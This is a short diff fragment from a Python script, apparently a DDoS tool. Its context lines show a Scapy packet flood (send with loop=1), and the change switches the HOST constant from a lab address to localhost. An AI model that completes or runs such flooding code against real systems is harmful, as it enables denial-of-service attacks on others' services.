@@ -22,7 +22,7 @@ def ddos(target_IP):
     p = ip / tcp / raw
     send(p, loop=1, verbose = 0)
 
-HOST = "192.168.56.103"
+HOST = "127.0.0.1"
 PORT = 1234
 ddosprocess = Process(target=ddos)
 
